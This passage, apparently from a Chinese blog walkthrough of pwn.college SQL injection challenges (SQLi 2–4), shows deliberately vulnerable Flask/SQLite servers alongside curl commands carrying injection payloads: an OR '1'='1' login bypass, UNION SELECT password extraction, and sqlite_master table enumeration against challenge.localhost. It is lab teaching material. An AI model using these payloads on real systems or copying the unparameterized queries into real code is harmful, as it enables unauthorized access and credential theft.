value=Submit&gt;</span></span><br><span class="line"><span class="string">        &lt;/form&gt;</span></span><br><span class="line"><span class="string">        &lt;/body&gt;&lt;/html&gt;</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">app.secret_key = os.urandom(<span class="number">8</span>)  <span class="comment"># 随机生成会话密钥</span></span><br><span class="line">port = <span class="number">8080</span> <span class="keyword">if</span> os.geteuid() <span class="keyword">else</span> <span class="number">80</span>  <span class="comment"># 根据用户权限选择端口</span></span><br><span class="line">app.config[<span class="string">&#x27;SERVER_NAME&#x27;</span>] = <span class="string">f&quot;challenge.localhost:<span class="subst">&#123;port&#125;</span>&quot;</span>  <span class="comment"># 配置服务器名称</span></span><br><span class="line">app.run(<span class="string">&quot;challenge.localhost&quot;</span>, port)  <span class="comment"># 启动应用程序</span></span><br><span class="line"><span class="comment">#!/opt/pwn.college/python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> tempfile</span><br><span class="line"><span class="keyword">import</span> sqlite3</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> flask</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = flask.Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">TemporaryDB</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="comment"># 创建一个临时数据库文件</span></span><br><span class="line">        self.db_file = tempfile.NamedTemporaryFile(<span class="string">&quot;x&quot;</span>, suffix=<span class="string">&quot;.db&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">execute</span>(<span class="params">self, sql, parameters=(<span class="params"></span>)</span>):</span><br><span class="line">        <span class="comment"># 执行 SQL 查询</span></span><br><span class="line">        connection = sqlite3.connect(self.db_file.name)</span><br><span class="line">        connection.row_factory = sqlite3.Row  <span class="comment"># 以字典形式返回行</span></span><br><span class="line">        cursor = connection.cursor()</span><br><span class="line">        result = cursor.execute(sql, parameters)</span><br><span class="line">        connection.commit()  <span class="comment"># 提交事务</span></span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">db = TemporaryDB()</span><br><span class="line"><span class="comment"># 创建一个包含 admin 用户的表，PIN 为随机生成的值</span></span><br><span class="line">db.execute(<span class="string">&quot;&quot;&quot;CREATE TABLE users AS SELECT &quot;admin&quot; AS username, ? as pin&quot;&quot;&quot;</span>, [random.randrange(<span class="number">2</span>**<span class="number">32</span>, <span class="number">2</span>**<span class="number">63</span>)])</span><br><span class="line"><span class="comment"># 插入一个 guest 用户，PIN 为 1337</span></span><br><span class="line">db.execute(<span class="string">&quot;&quot;&quot;INSERT INTO users SELECT &quot;guest&quot; as username, 1337 as pin&quot;&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span>, methods=[<span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge_post</span>():</span><br><span class="line">    <span class="comment"># 处理 POST 请求以进行登录</span></span><br><span class="line">    username = flask.request.form.get(<span class="string">&quot;username&quot;</span>)</span><br><span class="line">    pin = flask.request.form.get(<span class="string">&quot;pin&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 检查请求参数</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> username:</span><br><span class="line">        flask.abort(<span class="number">400</span>, <span class="string">&quot;Missing `username` form parameter&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> pin:</span><br><span class="line">        flask.abort(<span class="number">400</span>, <span class="string">&quot;Missing `pin` form parameter&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 检查 PIN 是否为数字</span></span><br><span class="line">    <span class="keyword">if</span> pin[<span class="number">0</span>] <span class="keyword">not</span> <span class="keyword">in</span> <span class="string">&quot;0123456789&quot;</span>:</span><br><span class="line">        flask.abort(<span class="number">400</span>, <span class="string">&quot;Invalid pin&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># 构造 SQL 查询以验证用户</span></span><br><span class="line">        query = <span class="string">f&#x27;SELECT rowid, * FROM users WHERE username = &quot;<span class="subst">&#123;username&#125;</span>&quot; AND pin = <span class="subst">&#123;pin&#125;</span>&#x27;</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;DEBUG: <span class="subst">&#123;query=&#125;</span>&quot;</span>)</span><br><span class="line">        user = db.execute(query).fetchone()  <span class="comment"># 执行查询并获取结果</span></span><br><span class="line">    <span class="keyword">except</span> sqlite3.Error <span class="keyword">as</span> e:</span><br><span class="line">        flask.abort(<span class="number">500</span>, <span class="string">f&quot;Query: <span class="subst">&#123;query&#125;</span>\nError: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 如果用户不存在，返回403</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> user:</span><br><span class="line">        flask.abort(<span class="number">403</span>, <span class="string">&quot;Invalid username or pin&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 登录成功，存储用户信息到会话中</span></span><br><span class="line">    flask.session[<span class="string">&quot;user&quot;</span>] = username</span><br><span class="line">    <span class="keyword">return</span> flask.redirect(flask.request.path)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge_get</span>():</span><br><span class="line">    <span class="comment"># 处理 GET 请求以显示登录页面或欢迎信息</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> (username := flask.session.get(<span class="string">&quot;user&quot;</span>, <span class="literal">None</span>)):</span><br><span class="line">        page = <span class="string">&quot;&lt;html&gt;&lt;body&gt;Welcome to the login service! Please log in as admin to get the flag.&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        page = <span class="string">f&quot;&lt;html&gt;&lt;body&gt;Hello, <span class="subst">&#123;username&#125;</span>!&quot;</span></span><br><span class="line">        <span class="keyword">if</span> username == <span class="string">&quot;admin&quot;</span>:</span><br><span class="line">            <span class="comment"># 如果用户是 admin，显示旗帜内容</span></span><br><span class="line">            page += <span class="string">&quot;&lt;br&gt;Here is your flag: &quot;</span> + <span class="built_in">open</span>(<span class="string">&quot;/flag&quot;</span>).read()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> page + <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        &lt;hr&gt;</span></span><br><span class="line"><span class="string">        &lt;form method=post&gt;</span></span><br><span class="line"><span class="string">        User:&lt;input type=text name=username&gt;PIN:&lt;input type=text name=pin&gt;&lt;input type=submit value=Submit&gt;</span></span><br><span class="line"><span class="string">        &lt;/form&gt;</span></span><br><span class="line"><span class="string">        &lt;/body&gt;&lt;/html&gt;</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">app.secret_key = os.urandom(<span class="number">8</span>)  <span class="comment"># 随机生成会话密钥</span></span><br><span class="line">port = <span class="number">8080</span> <span class="keyword">if</span> os.geteuid() <span class="keyword">else</span> <span class="number">80</span>  <span class="comment"># 根据用户权限选择端口</span></span><br><span class="line">app.config[<span class="string">&#x27;SERVER_NAME&#x27;</span>] = <span class="string">f&quot;challenge.localhost:<span class="subst">&#123;port&#125;</span>&quot;</span>  <span class="comment"># 配置服务器名称</span></span><br><span class="line">app.run(<span class="string">&quot;challenge.localhost&quot;</span>, port)  <span class="comment"># 启动应用程序</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="3-10-SQLi-2"><a href="#3-10-SQLi-2" class="headerlink" title="3.10 SQLi 2"></a>3.10 SQLi 2</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">curl -c cookies.txt -X POST http://challenge.localhost -d &quot;username=admin&amp;password=anything&#x27; OR &#x27;1&#x27;=&#x27;1&#x27; --&quot;</span><br><span class="line"></span><br><span class="line">curl -c cookies.txt -X POST http://challenge.localhost -d &quot;username=admin&amp;password=anything&#x27; OR &#x27;1&#x27;=&#x27;1&#x27; --&quot;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/opt/pwn.college/python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> tempfile</span><br><span class="line"><span class="keyword">import</span> sqlite3</span><br><span class="line"><span class="keyword">import</span> flask</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = flask.Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">TemporaryDB</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="comment"># 创建一个临时数据库文件</span></span><br><span class="line">        self.db_file = tempfile.NamedTemporaryFile(<span class="string">&quot;x&quot;</span>, suffix=<span class="string">&quot;.db&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">execute</span>(<span class="params">self, sql, parameters=(<span class="params"></span>)</span>):</span><br><span class="line">        <span class="comment"># 连接到 SQLite 数据库，执行 SQL 查询并提交更改</span></span><br><span class="line">        connection = sqlite3.connect(self.db_file.name)</span><br><span class="line">        connection.row_factory = sqlite3.Row  <span class="comment"># 返回字典形式的行</span></span><br><span class="line">        cursor = connection.cursor()</span><br><span class="line">        result = cursor.execute(sql, parameters)  <span class="comment"># 执行 SQL 查询</span></span><br><span class="line">        connection.commit()  <span class="comment"># 提交事务</span></span><br><span class="line">        <span class="keyword">return</span> result  <span class="comment"># 返回查询结果</span></span><br><span class="line"></span><br><span class="line">db = TemporaryDB()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建一个包含 &quot;admin&quot; 用户和随机生成密码的表</span></span><br><span class="line">db.execute(<span class="string">&quot;&quot;&quot;CREATE TABLE users AS SELECT &quot;admin&quot; AS username, ? as password&quot;&quot;&quot;</span>, [os.urandom(<span class="number">8</span>)])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 插入一个名为 &quot;guest&quot; 的用户，密码为 &quot;password&quot;</span></span><br><span class="line">db.execute(<span class="string">&quot;&quot;&quot;INSERT INTO users SELECT &quot;guest&quot; as username, &quot;password&quot; as password&quot;&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span>, methods=[<span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge_post</span>():</span><br><span class="line">    <span class="comment"># 处理 POST 请求，提取用户名和密码</span></span><br><span class="line">    username = flask.request.form.get(<span class="string">&quot;username&quot;</span>)</span><br><span class="line">    password = flask.request.form.get(<span class="string">&quot;password&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 检查是否缺少 username 或 password 参数</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> username:</span><br><span class="line">        flask.abort(<span class="number">400</span>, <span class="string">&quot;Missing `username` form parameter&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> password:</span><br><span class="line">        flask.abort(<span class="number">400</span>, <span class="string">&quot;Missing `password` form parameter&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># 构造 SQL 查询以验证用户和密码</span></span><br><span class="line">        query = <span class="string">f&quot;SELECT rowid, * FROM users WHERE username = &#x27;<span class="subst">&#123;username&#125;</span>&#x27; AND password = &#x27;<span class="subst">&#123;password&#125;</span>&#x27;&quot;</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;DEBUG: <span class="subst">&#123;query=&#125;</span>&quot;</span>)  <span class="comment"># 调试信息，输出构造的 SQL 查询</span></span><br><span class="line">        user = db.execute(query).fetchone()  <span class="comment"># 执行查询并获取结果</span></span><br><span class="line">    <span class="keyword">except</span> sqlite3.Error <span class="keyword">as</span> e:</span><br><span class="line">        <span class="comment"># 如果 SQL 查询出错，返回 500 错误</span></span><br><span class="line">        flask.abort(<span class="number">500</span>, <span class="string">f&quot;Query: <span class="subst">&#123;query&#125;</span>\nError: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 如果没有找到用户，返回 403 错误</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> user:</span><br><span class="line">        flask.abort(<span class="number">403</span>, <span class="string">&quot;Invalid username or password&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 如果找到用户，设置 session 并重定向回当前路径</span></span><br><span class="line">    flask.session[<span class="string">&quot;user&quot;</span>] = username</span><br><span class="line">    <span class="keyword">return</span> flask.redirect(flask.request.path)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge_get</span>():</span><br><span class="line">    <span class="comment"># 处理 GET 请求，显示登录页面或欢迎页面</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> (username := flask.session.get(<span class="string">&quot;user&quot;</span>, <span class="literal">None</span>)):</span><br><span class="line">        <span class="comment"># 如果用户没有登录，显示登录页面</span></span><br><span class="line">        page = <span class="string">&quot;&lt;html&gt;&lt;body&gt;Welcome to the login service! Please log in as admin to get the flag.&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="comment"># 如果用户已登录，显示欢迎信息</span></span><br><span class="line">        page = <span class="string">f&quot;&lt;html&gt;&lt;body&gt;Hello, <span class="subst">&#123;username&#125;</span>!&quot;</span></span><br><span class="line">        <span class="keyword">if</span> username == <span class="string">&quot;admin&quot;</span>:</span><br><span class="line">            <span class="comment"># 如果用户是 admin，显示 flag</span></span><br><span class="line">            page += <span class="string">&quot;&lt;br&gt;Here is your flag: &quot;</span> + <span class="built_in">open</span>(<span class="string">&quot;/flag&quot;</span>).read()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 显示登录表单</span></span><br><span class="line">    <span class="keyword">return</span> page + <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        &lt;hr&gt;</span></span><br><span class="line"><span class="string">        &lt;form method=post&gt;</span></span><br><span class="line"><span class="string">        User:&lt;input type=text name=username&gt;Pass:&lt;input type=text name=password&gt;&lt;input type=submit value=Submit&gt;</span></span><br><span class="line"><span class="string">        &lt;/form&gt;</span></span><br><span class="line"><span class="string">        &lt;/body&gt;&lt;/html&gt;</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 随机生成 Flask 的会话密钥</span></span><br><span class="line">app.secret_key = os.urandom(<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 根据用户权限设置端口：普通用户使用 8080，root 用户使用 80</span></span><br><span class="line">port = <span class="number">8080</span> <span class="keyword">if</span> os.geteuid() <span class="keyword">else</span> <span class="number">80</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 配置服务器名称</span></span><br><span class="line">app.config[<span class="string">&#x27;SERVER_NAME&#x27;</span>] = <span class="string">f&quot;challenge.localhost:<span class="subst">&#123;port&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 启动 Flask 应用程序，监听 challenge.localhost</span></span><br><span class="line">app.run(<span class="string">&quot;challenge.localhost&quot;</span>, port)</span><br></pre></td></tr></table></figure><h3 id="3-11-SQLi-3"><a href="#3-11-SQLi-3" class="headerlink" title="3.11 SQLi 3"></a>3.11 SQLi 3</h3><p>这个是<code>server</code>的原代码，阅读原代码后我们知道当前服务器只有一个<code>GET</code>方法，该方法执行一个查询语句<code>sql = f&#39;SELECT username FROM users WHERE username LIKE &quot;&#123;query&#125;&quot;&#39;</code>，我们如何通过链接查询语句构造查询提取密码呢？</p><p>首先要做的是关闭当前查询语句的双引号，并通过<code>UNION</code>合并查询，得到<code>users</code>表中的<code>password</code>字段。</p><p><code>curl &quot;http://challenge.localhost:80/?query=%22%20UNION%20SELECT%20password%20FROM%20users%20WHERE%20username%3D%27admin%27%20--&quot;</code>会生成如下<code>SQL</code>语句<code>SELECT username FROM users WHERE username LIKE &quot;&quot; UNION SELECT password FROM users WHERE username=&#39;admin&#39; --&quot;</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/opt/pwn.college/python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> tempfile</span><br><span class="line"><span class="keyword">import</span> sqlite3</span><br><span class="line"><span class="keyword">import</span> flask</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = flask.Flask(__name__)  <span class="comment"># 创建一个Flask应用</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">TemporaryDB</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="comment"># 创建一个临时的SQLite数据库文件，后缀为`.db`</span></span><br><span class="line">        self.db_file = tempfile.NamedTemporaryFile(<span class="string">&quot;x&quot;</span>, suffix=<span class="string">&quot;.db&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">execute</span>(<span class="params">self, sql, parameters=(<span class="params"></span>)</span>):</span><br><span class="line">        <span class="comment"># 连接SQLite数据库，并且使用Row工厂，以便结果可以通过列名访问</span></span><br><span class="line">        connection = sqlite3.connect(self.db_file.name)</span><br><span class="line">        connection.row_factory = sqlite3.Row</span><br><span class="line">        cursor = connection.cursor()  <span class="comment"># 创建一个游标</span></span><br><span class="line">        <span class="comment"># 执行SQL语句，传递参数</span></span><br><span class="line">        result = cursor.execute(sql, parameters)</span><br><span class="line">        connection.commit()  <span class="comment"># 提交更改（如果有）</span></span><br><span class="line">        <span class="keyword">return</span> result  <span class="comment"># 返回查询结果</span></span><br><span class="line"></span><br><span class="line">db = TemporaryDB()  <span class="comment"># 创建一个TemporaryDB实例</span></span><br><span class="line"><span class="comment"># 创建名为`users`的表，并插入一条记录。用户名为&quot;admin&quot;，密码为读取的`/flag`文件内容</span></span><br><span class="line"><span class="comment"># AS SELECT &quot;admin&quot; AS username, ? AS password表示从`/flag`读取内容作为`admin`的密码</span></span><br><span class="line">db.execute(<span class="string">&quot;&quot;&quot;CREATE TABLE users AS SELECT &quot;admin&quot; AS username, ? as password&quot;&quot;&quot;</span>, [<span class="built_in">open</span>(<span class="string">&quot;/flag&quot;</span>).read()])</span><br><span class="line"><span class="comment"># 向`users`表中插入第二条记录，用户名为&quot;guest&quot;，密码为&quot;password&quot;</span></span><br><span class="line">db.execute(<span class="string">&quot;&quot;&quot;INSERT INTO users SELECT &quot;guest&quot; as username, &quot;password&quot; as password&quot;&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)  </span><span class="comment"># 定义Flask路由，处理GET请求</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge</span>():</span><br><span class="line">    <span class="comment"># 从请求参数中获取`query`值，默认为&quot;%&quot;（这表示SQL中的通配符，匹配所有用户名）</span></span><br><span class="line">    query = flask.request.args.get(<span class="string">&quot;query&quot;</span>, <span class="string">&quot;%&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># 构建SQL查询语句，用LIKE查询`users`表中符合条件的用户名</span></span><br><span class="line">        sql = <span class="string">f&#x27;SELECT username FROM users WHERE username LIKE &quot;<span class="subst">&#123;query&#125;</span>&quot;&#x27;</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;DEBUG: <span class="subst">&#123;query=&#125;</span>&quot;</span>)  <span class="comment"># 打印调试信息</span></span><br><span class="line">        <span class="comment"># 执行SQL查询，获取查询结果，将所有用户名拼接为字符串返回</span></span><br><span class="line">        results = <span class="string">&quot;\n&quot;</span>.join(user[<span class="string">&quot;username&quot;</span>] <span class="keyword">for</span> user <span class="keyword">in</span> db.execute(sql).fetchall())</span><br><span class="line">    <span class="keyword">except</span> sqlite3.Error <span class="keyword">as</span> e:</span><br><span class="line">        <span class="comment"># 如果SQL查询出错，返回错误信息</span></span><br><span class="line">        results = <span class="string">f&quot;SQL error: <span class="subst">&#123;e&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 返回一个HTML页面，包含查询表单、执行的SQL语句和查询结果</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">f&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        &lt;html&gt;&lt;body&gt;Welcome to the user query service!</span></span><br><span class="line"><span class="string">        &lt;form&gt;Query:&lt;input type=text name=query value=&#x27;<span class="subst">&#123;query&#125;</span>&#x27;&gt;&lt;input type=submit value=Submit&gt;&lt;/form&gt;</span></span><br><span class="line"><span class="string">        &lt;hr&gt;</span></span><br><span class="line"><span class="string">        &lt;b&gt;Query:&lt;/b&gt; &lt;pre&gt;<span class="subst">&#123;sql&#125;</span>&lt;/pre&gt;&lt;br&gt;</span></span><br><span class="line"><span class="string">        &lt;b&gt;Results:&lt;/b&gt;&lt;pre&gt;<span class="subst">&#123;results&#125;</span>&lt;/pre&gt;</span></span><br><span class="line"><span class="string">        &lt;/body&gt;&lt;/html&gt;</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">app.secret_key = os.urandom(<span class="number">8</span>)  <span class="comment"># 生成随机的密钥，用于Flask会话安全</span></span><br><span class="line">app.config[<span class="string">&#x27;SERVER_NAME&#x27;</span>] = <span class="string">f&quot;challenge.localhost:80&quot;</span>  <span class="comment"># 设置Flask服务器名</span></span><br><span class="line"><span class="comment"># 启动Flask应用，监听在`challenge.localhost`的80端口</span></span><br><span class="line">app.run(<span class="string">&quot;challenge.localhost&quot;</span>, <span class="number">80</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="3-12-SQLi-4"><a href="#3-12-SQLi-4" class="headerlink" title="3.12 SQLi 4"></a>3.12 SQLi 4</h3><p><em>几乎所有现代数据库都会将数据库布局的规范信息存储在一个表中。攻击者可以查询这个表，获取表名、字段名以及他们可能需要的其他信息！</em></p><p>这个题目比上一个多一个步骤，就是查询随机生成的总表名，同样，我们使用双引号匹配原代码中的双引号：</p><p><code>curl &quot;http://challenge.localhost:80/?query=%25%22%20UNION%20SELECT%20name%20FROM%20sqlite_master%20WHERE%20type%3D%27table%27%20--&quot;</code>命令生成查询：<code>SELECT username FROM &#123;user_table&#125; WHERE username LIKE &quot;%&quot; UNION SELECT name FROM sqlite_master WHERE type=&#39;table&#39; --&quot;</code>获得表名字。</p><p>然后就按照表名查询flag、例如我这里的表名为<code>users_4570258226</code></p><p><code>curl &quot;http://challenge.localhost:80/?query=admin%22%20UNION%20SELECT%20password%20FROM%20users_4570258226%20WHERE%20username%3D%27admin%27%20--&quot;</code> 生成的SQL查询为<code>SELECT username FROM users_4570258226 WHERE username LIKE &quot;admin&quot; UNION SELECT password FROM users_4570258226 WHERE username=&#39;admin&#39; --&quot;</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/opt/pwn.college/python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> tempfile</span><br><span class="line"><span class="keyword">import</span> sqlite3</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> flask</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = flask.Flask(__name__)  <span class="comment"># 创建一个Flask应用程序</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">TemporaryDB</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="comment"># 创建一个临时数据库文件，后缀为 `.db`</span></span><br><span class="line">        self.db_file = 